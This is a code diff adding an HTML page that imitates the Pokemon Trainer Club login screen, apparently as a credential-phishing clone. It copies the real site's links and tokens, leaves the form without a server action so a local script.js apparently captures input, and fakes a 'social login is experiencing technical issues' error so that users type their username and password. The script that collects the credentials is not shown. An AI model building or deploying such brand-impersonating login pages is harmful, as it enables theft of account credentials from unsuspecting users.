@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html ontouchmove>
+
+<head>
+    <title></title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body class="base-body">
+    <div class="base-container-border">
+        <div class="logo-wrapper"><img class="logo" src="logo_2.png" alt=" logo"></div>
+
+        <div class="body-container">
+            <div class="body-wrapper">
+                <h2>Log in to your Pokemon Trainer Central account</h2>
+                <div class="error-wrapper">
+                    <p class="error-message"></p>
+                </div>
+                <div class="form-error-wrapper hide-error">
+                    <p class="error-message">Both username and password are required fields.</p>
+                </div>
+                <form class="sign-in-form">
+                    <div class="main-content">
+                        <div class="username-input-wrapper input-wrapper"><input class="username-input input" type="text" id="email" name="email" placeholder="Username"></div>
+                        <div class="password-input-wrapper input-wrapper">
+                            <div class="password-input-field-wrapper"><input class="password-input input" type="password" id="password" name="password" placeholder="Password"><button class="visibility-icon hide-password" id="visibility-icon" type="button" alt="Show Password"></button></div>
+                            <a class="forgot-password-link" href="https://recover.pokemon.com?login_challenge=jbG0d0ktWag4WtHRhi9lkmWYL_Q459QGftYSVEcIpQ15314R5etTLQX01fqJeBwEb9cOehgMpx0GJjlVk93fM18E70Brgfg6G-PiM1K6GbsfGgA9TVUAo7CpLX8Ao-pYRHp5cEO4NFYR3nTi8TA9C4PBaI4yvnjCQXwLgPtSKgZIYbQHS5b_uWJ_CWlCQFH6uGsEbqJ9BO4IJ0lHsNa_nwZnNUFjyckCOUYOYWNCYBdsKK_oEt6AMa853nwSv7BQn3CYft9wNA3-4kRE95QM6mANVW6NNAVjLYekZdGKXLJUivwbbxMLIaUgluBVHqBgpw7JmGt2Sj4sDMYPbcrWBcIsaeRFeYZMyyW5BYguH1NR4OQN71E78303bd1N18afS8byRBdYfMKjjASaAzOCt2OwzwB856hNnqMlma9qk_aZnUWmkMGLE8d4DY4Sz1wpF5CNLYSodgAWnnVfzejMxFb7ntcDv9JfkqMDGdaLNxrTi_Eo8DjTwyAnkjBqbPdCyOtpR4S4QVORYJk1zSU0XjpvbaiVWRwSYewZaYvXwldhnYh_9Hs_5trtVRpqUhjDKNdb0mwM3RVrlCxPwG8UeCJfGejG27b2LGkIjfUnzqW6EMFe-FnVC9e6t5fV9X_e5e5R5IJ9GQa9GnHdj0ntJBuv6WI1JTh0UekHKE4XNf48Hr0R7TlGIb_KNpAwXnPNO6hNzznAn0VmemHAStTgYz5EfqF1GUHicceAHXma7w_PCzN3xUYTOsnXaldWQ8er-_RtAaxtgntv-MGCegCF7e633gt1bZj3TxDD6p4x768zAre4G9ZV7u6e3eDw_x5mRlt5XCpBraup_0V3nEqkSRhg-YJIxT5Oue6EIhPtDddrMxstBs_4a_8K_XA7W6zS1OBIeM4b7-uLTWkn5Fjcd8bkHijsf7waYlt511cVt809waUNJ9HBy7Ygksfo_e0V6q15RutSQxE-1gz_exsrG5F4hAmDxdAmpi_InNM_08joL2pAE8WeT72m1j47cPS6XMcWmNLW2qAJPaikAmOZisQV1L9hCWsaJevFx5vxX7hdlEcyYeBAG4ysX6-3rCvZkXy1Z5H892RCMJY6qWKnFkjxKUnj3yF2uZzS5vDeL_4O3FQWiCJxkBTNGmgVf6gh7FZs-yd_yJ8gpJcfTCKQV5NS4MxIOxOI3Qgv__MCzTwLYwOsMD3XX8sJtf-eZQ8tH6Z4mlB4mVuOcRCJz__0tzOaY2w-MKhsnliajcyrJ5YPHGEnFcswdGQgvw-GMAYTcotFCMAdYZmH60EPqEXrz7ONXr2w_7ucQBcoQqOcMum6eSczZSqs0u_m_JCjlIUtjfiHxb3dJsgyoeMsdHqg5RJXnpdioTcIvGE7J4BJWPjkWiPTaMqpHcm5-EKn35P062beiQyeAxmPBM-34iCBIIDR05cRWZgnOX8QG9UlTvdnXP6WWcg4GE9MCHsGcZPsVbvUZkXwUdW40a_aprO84vG7FpPAQq_i8mNK31cY5sYUFSzUKCU10nF52plQSuEgE0zA7ubPYoQSrsQPM2ZgM1sO7uJTQs4rsJu2WEDNlY4oZacpC3O-PZlx_tOfFQRTRINMNebYV3UN_C5PKA4k81ovR8OvLPacgE7VaXQNpvwBuntF6Gtwg2nm3FfpZgoAKH6XKbow5tjddtC3v_lO-7UvZiaD206GupBbT8-gHNVUoUN7w3LmydNMrka7d2Lp7eRAcrmxM1mLwgH5mtDMW5Zqoyq8wqydIwF8q3ediC_2rpaFaG68jLSlFqVhXUqwP8zal5poLXvDmHzFoOjlYcG0bBI5kn4VHFk2h-8dR8iFxEHxzxbpKFTebFpNa_r_&amp;lng="
+                                id="trouble-logging-in">Trouble logging in?</a><a class="hide-account-link" href="https://club.pokemon.com/us/pokemon-trainer-club/forgot-username" id="forgot-username" target="_blank" rel="noopener noreferrer">I forgot my username</a>
+                            <a
+                                class="hide-account-link" href="https://club.pokemon.com/us/pokemon-trainer-club/forgot-password" id="forgot-password" target="_blank" rel="noopener noreferrer">I forgot my password</a>
+                        </div><input class="button sign-in-button" type="submit" id="accept" value="Log In"></div>
+
+
+
+
+                </form>
+                <div class="social-login">
+                    <div class="divider">
+                        <span>or log in with</span>
+                    </div>
+                    <div class="social-icons">
+                        <a href="#" class="social-icon" onclick="showSocialError(event)">
+              <img src="google_logo.svg" alt="Google">
+            </a>
+                        <a href="#" class="social-icon" onclick="showSocialError(event)">
+              <img src="apple_logo.svg" alt="Apple">
+            </a>
+                    </div>
+                    <div id="social-error-msg" class="social-error">
+                        Social login is currently experiencing technical issues.
+                    </div>
+                </div>
+                <form class="create-account-link" id="create-user-form" action="https://join.pokemon.com?challenge=jbG0d0ktWag4WtHRhi9lkmWYL_Q459QGftYSVEcIpQ15314R5etTLQX01fqJeBwEb9cOehgMpx0GJjlVk93fM18E70Brgfg6G-PiM1K6GbsfGgA9TVUAo7CpLX8Ao-pYRHp5cEO4NFYR3nTi8TA9C4PBaI4yvnjCQXwLgPtSKgZIYbQHS5b_uWJ_CWlCQFH6uGsEbqJ9BO4IJ0lHsNa_nwZnNUFjyckCOUYOYWNCYBdsKK_oEt6AMa853nwSv7BQn3CYft9wNA3-4kRE95QM6mANVW6NNAVjLYekZdGKXLJUivwbbxMLIaUgluBVHqBgpw7JmGt2Sj4sDMYPbcrWBcIsaeRFeYZMyyW5BYguH1NR4OQN71E78303bd1N18afS8byRBdYfMKjjASaAzOCt2OwzwB856hNnqMlma9qk_aZnUWmkMGLE8d4DY4Sz1wpF5CNLYSodgAWnnVfzejMxFb7ntcDv9JfkqMDGdaLNxrTi_Eo8DjTwyAnkjBqbPdCyOtpR4S4QVORYJk1zSU0XjpvbaiVWRwSYewZaYvXwldhnYh_9Hs_5trtVRpqUhjDKNdb0mwM3RVrlCxPwG8UeCJfGejG27b2LGkIjfUnzqW6EMFe-FnVC9e6t5fV9X_e5e5R5IJ9GQa9GnHdj0ntJBuv6WI1JTh0UekHKE4XNf48Hr0R7TlGIb_KNpAwXnPNO6hNzznAn0VmemHAStTgYz5EfqF1GUHicceAHXma7w_PCzN3xUYTOsnXaldWQ8er-_RtAaxtgntv-MGCegCF7e633gt1bZj3TxDD6p4x768zAre4G9ZV7u6e3eDw_x5mRlt5XCpBraup_0V3nEqkSRhg-YJIxT5Oue6EIhPtDddrMxstBs_4a_8K_XA7W6zS1OBIeM4b7-uLTWkn5Fjcd8bkHijsf7waYlt511cVt809waUNJ9HBy7Ygksfo_e0V6q15RutSQxE-1gz_exsrG5F4hAmDxdAmpi_InNM_08joL2pAE8WeT72m1j47cPS6XMcWmNLW2qAJPaikAmOZisQV1L9hCWsaJevFx5vxX7hdlEcyYeBAG4ysX6-3rCvZkXy1Z5H892RCMJY6qWKnFkjxKUnj3yF2uZzS5vDeL_4O3FQWiCJxkBTNGmgVf6gh7FZs-yd_yJ8gpJcfTCKQV5NS4MxIOxOI3Qgv__MCzTwLYwOsMD3XX8sJtf-eZQ8tH6Z4mlB4mVuOcRCJz__0tzOaY2w-MKhsnliajcyrJ5YPHGEnFcswdGQgvw-GMAYTcotFCMAdYZmH60EPqEXrz7ONXr2w_7ucQBcoQqOcMum6eSczZSqs0u_m_JCjlIUtjfiHxb3dJsgyoeMsdHqg5RJXnpdioTcIvGE7J4BJWPjkWiPTaMqpHcm5-EKn35P062beiQyeAxmPBM-34iCBIIDR05cRWZgnOX8QG9UlTvdnXP6WWcg4GE9MCHsGcZPsVbvUZkXwUdW40a_aprO84vG7FpPAQq_i8mNK31cY5sYUFSzUKCU10nF52plQSuEgE0zA7ubPYoQSrsQPM2ZgM1sO7uJTQs4rsJu2WEDNlY4oZacpC3O-PZlx_tOfFQRTRINMNebYV3UN_C5PKA4k81ovR8OvLPacgE7VaXQNpvwBuntF6Gtwg2nm3FfpZgoAKH6XKbow5tjddtC3v_lO-7UvZiaD206GupBbT8-gHNVUoUN7w3LmydNMrka7d2Lp7eRAcrmxM1mLwgH5mtDMW5Zqoyq8wqydIwF8q3ediC_2rpaFaG68jLSlFqVhXUqwP8zal5poLXvDmHzFoOjlYcG0bBI5kn4VHFk2h-8dR8iFxEHxzxbpKFTebFpNa_r_&amp;lng="
+                    style="width:100%;text-align:center;">
+
+
+
+                    <label>Don't have an account?</label><input type="hidden" value="jbG0d0ktWag4WtHRhi9lkmWYL_Q459QGftYSVEcIpQ15314R5etTLQX01fqJeBwEb9cOehgMpx0GJjlVk93fM18E70Brgfg6G-PiM1K6GbsfGgA9TVUAo7CpLX8Ao-pYRHp5cEO4NFYR3nTi8TA9C4PBaI4yvnjCQXwLgPtSKgZIYbQHS5b_uWJ_CWlCQFH6uGsEbqJ9BO4IJ0lHsNa_nwZnNUFjyckCOUYOYWNCYBdsKK_oEt6AMa853nwSv7BQn3CYft9wNA3-4kRE95QM6mANVW6NNAVjLYekZdGKXLJUivwbbxMLIaUgluBVHqBgpw7JmGt2Sj4sDMYPbcrWBcIsaeRFeYZMyyW5BYguH1NR4OQN71E78303bd1N18afS8byRBdYfMKjjASaAzOCt2OwzwB856hNnqMlma9qk_aZnUWmkMGLE8d4DY4Sz1wpF5CNLYSodgAWnnVfzejMxFb7ntcDv9JfkqMDGdaLNxrTi_Eo8DjTwyAnkjBqbPdCyOtpR4S4QVORYJk1zSU0XjpvbaiVWRwSYewZaYvXwldhnYh_9Hs_5trtVRpqUhjDKNdb0mwM3RVrlCxPwG8UeCJfGejG27b2LGkIjfUnzqW6EMFe-FnVC9e6t5fV9X_e5e5R5IJ9GQa9GnHdj0ntJBuv6WI1JTh0UekHKE4XNf48Hr0R7TlGIb_KNpAwXnPNO6hNzznAn0VmemHAStTgYz5EfqF1GUHicceAHXma7w_PCzN3xUYTOsnXaldWQ8er-_RtAaxtgntv-MGCegCF7e633gt1bZj3TxDD6p4x768zAre4G9ZV7u6e3eDw_x5mRlt5XCpBraup_0V3nEqkSRhg-YJIxT5Oue6EIhPtDddrMxstBs_4a_8K_XA7W6zS1OBIeM4b7-uLTWkn5Fjcd8bkHijsf7waYlt511cVt809waUNJ9HBy7Ygksfo_e0V6q15RutSQxE-1gz_exsrG5F4hAmDxdAmpi_InNM_08joL2pAE8WeT72m1j47cPS6XMcWmNLW2qAJPaikAmOZisQV1L9hCWsaJevFx5vxX7hdlEcyYeBAG4ysX6-3rCvZkXy1Z5H892RCMJY6qWKnFkjxKUnj3yF2uZzS5vDeL_4O3FQWiCJxkBTNGmgVf6gh7FZs-yd_yJ8gpJcfTCKQV5NS4MxIOxOI3Qgv__MCzTwLYwOsMD3XX8sJtf-eZQ8tH6Z4mlB4mVuOcRCJz__0tzOaY2w-MKhsnliajcyrJ5YPHGEnFcswdGQgvw-GMAYTcotFCMAdYZmH60EPqEXrz7ONXr2w_7ucQBcoQqOcMum6eSczZSqs0u_m_JCjlIUtjfiHxb3dJsgyoeMsdHqg5RJXnpdioTcIvGE7J4BJWPjkWiPTaMqpHcm5-EKn35P062beiQyeAxmPBM-34iCBIIDR05cRWZgnOX8QG9UlTvdnXP6WWcg4GE9MCHsGcZPsVbvUZkXwUdW40a_aprO84vG7FpPAQq_i8mNK31cY5sYUFSzUKCU10nF52plQSuEgE0zA7ubPYoQSrsQPM2ZgM1sO7uJTQs4rsJu2WEDNlY4oZacpC3O-PZlx_tOfFQRTRINMNebYV3UN_C5PKA4k81ovR8OvLPacgE7VaXQNpvwBuntF6Gtwg2nm3FfpZgoAKH6XKbow5tjddtC3v_lO-7UvZiaD206GupBbT8-gHNVUoUN7w3LmydNMrka7d2Lp7eRAcrmxM1mLwgH5mtDMW5Zqoyq8wqydIwF8q3ediC_2rpaFaG68jLSlFqVhXUqwP8zal5poLXvDmHzFoOjlYcG0bBI5kn4VHFk2h-8dR8iFxEHxzxbpKFTebFpNa_r_"
+                        name="challenge"><input class="button blue-button button-secondary" type="submit" value="Create an Account"></form>
+                <form class="hide-account-link" id="legacy-create-user-form" action="https://club.pokemon.com/us/pokemon-trainer-club/sign-up" target="_blank" style="width:100%;text-align:center;"><label>Don't have an account?</label><input type="hidden" value="jbG0d0ktWag4WtHRhi9lkmWYL_Q459QGftYSVEcIpQ15314R5etTLQX01fqJeBwEb9cOehgMpx0GJjlVk93fM18E70Brgfg6G-PiM1K6GbsfGgA9TVUAo7CpLX8Ao-pYRHp5cEO4NFYR3nTi8TA9C4PBaI4yvnjCQXwLgPtSKgZIYbQHS5b_uWJ_CWlCQFH6uGsEbqJ9BO4IJ0lHsNa_nwZnNUFjyckCOUYOYWNCYBdsKK_oEt6AMa853nwSv7BQn3CYft9wNA3-4kRE95QM6mANVW6NNAVjLYekZdGKXLJUivwbbxMLIaUgluBVHqBgpw7JmGt2Sj4sDMYPbcrWBcIsaeRFeYZMyyW5BYguH1NR4OQN71E78303bd1N18afS8byRBdYfMKjjASaAzOCt2OwzwB856hNnqMlma9qk_aZnUWmkMGLE8d4DY4Sz1wpF5CNLYSodgAWnnVfzejMxFb7ntcDv9JfkqMDGdaLNxrTi_Eo8DjTwyAnkjBqbPdCyOtpR4S4QVORYJk1zSU0XjpvbaiVWRwSYewZaYvXwldhnYh_9Hs_5trtVRpqUhjDKNdb0mwM3RVrlCxPwG8UeCJfGejG27b2LGkIjfUnzqW6EMFe-FnVC9e6t5fV9X_e5e5R5IJ9GQa9GnHdj0ntJBuv6WI1JTh0UekHKE4XNf48Hr0R7TlGIb_KNpAwXnPNO6hNzznAn0VmemHAStTgYz5EfqF1GUHicceAHXma7w_PCzN3xUYTOsnXaldWQ8er-_RtAaxtgntv-MGCegCF7e633gt1bZj3TxDD6p4x768zAre4G9ZV7u6e3eDw_x5mRlt5XCpBraup_0V3nEqkSRhg-YJIxT5Oue6EIhPtDddrMxstBs_4a_8K_XA7W6zS1OBIeM4b7-uLTWkn5Fjcd8bkHijsf7waYlt511cVt809waUNJ9HBy7Ygksfo_e0V6q15RutSQxE-1gz_exsrG5F4hAmDxdAmpi_InNM_08joL2pAE8WeT72m1j47cPS6XMcWmNLW2qAJPaikAmOZisQV1L9hCWsaJevFx5vxX7hdlEcyYeBAG4ysX6-3rCvZkXy1Z5H892RCMJY6qWKnFkjxKUnj3yF2uZzS5vDeL_4O3FQWiCJxkBTNGmgVf6gh7FZs-yd_yJ8gpJcfTCKQV5NS4MxIOxOI3Qgv__MCzTwLYwOsMD3XX8sJtf-eZQ8tH6Z4mlB4mVuOcRCJz__0tzOaY2w-MKhsnliajcyrJ5YPHGEnFcswdGQgvw-GMAYTcotFCMAdYZmH60EPqEXrz7ONXr2w_7ucQBcoQqOcMum6eSczZSqs0u_m_JCjlIUtjfiHxb3dJsgyoeMsdHqg5RJXnpdioTcIvGE7J4BJWPjkWiPTaMqpHcm5-EKn35P062beiQyeAxmPBM-34iCBIIDR05cRWZgnOX8QG9UlTvdnXP6WWcg4GE9MCHsGcZPsVbvUZkXwUdW40a_aprO84vG7FpPAQq_i8mNK31cY5sYUFSzUKCU10nF52plQSuEgE0zA7ubPYoQSrsQPM2ZgM1sO7uJTQs4rsJu2WEDNlY4oZacpC3O-PZlx_tOfFQRTRINMNebYV3UN_C5PKA4k81ovR8OvLPacgE7VaXQNpvwBuntF6Gtwg2nm3FfpZgoAKH6XKbow5tjddtC3v_lO-7UvZiaD206GupBbT8-gHNVUoUN7w3LmydNMrka7d2Lp7eRAcrmxM1mLwgH5mtDMW5Zqoyq8wqydIwF8q3ediC_2rpaFaG68jLSlFqVhXUqwP8zal5poLXvDmHzFoOjlYcG0bBI5kn4VHFk2h-8dR8iFxEHxzxbpKFTebFpNa_r_"
+                        name="challenge"><input class="button blue-button button-secondary" type="submit" value="Create an Account"></form>
+            </div>
+        </div>
+        <div class="footer-container">
+            <div class="footer-container-top"><label class="copyright">@2026 Pokemon.
+@1995 - 2026 Nintendo/Creatures Inc./GAME FREAK inc. TM, @Nintendo.</label></div>
+            <script src="script.js"></script>
+</body>
+
+</html>
